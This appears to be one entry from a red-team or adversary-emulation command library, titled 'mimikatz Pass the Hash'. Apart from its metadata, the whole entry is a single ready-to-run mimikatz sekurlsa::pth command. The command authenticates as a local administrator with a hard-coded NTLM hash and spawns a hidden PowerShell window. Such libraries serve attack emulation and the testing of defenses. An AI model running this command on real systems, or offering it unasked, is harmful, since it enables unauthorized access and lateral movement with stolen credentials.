---
id: 01588395-0448-4287-b074-3b8188516598
name: mimikatz Pass the Hash
type: command
executor: bash
data: 'mimikatz sekurlsa::pth /user:localadmin /domain:. /ntlm:21306681c738c3ed2d615e29be1574a3
  /run:powershell -w hidden

  '
output: null
created_at: '2020-07-14T18:21:34.530529+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# mimikatz Pass the Hash

```bash
mimikatz sekurlsa::pth /user:localadmin /domain:. /ntlm:21306681c738c3ed2d615e29be1574a3 /run:powershell -w hidden

```
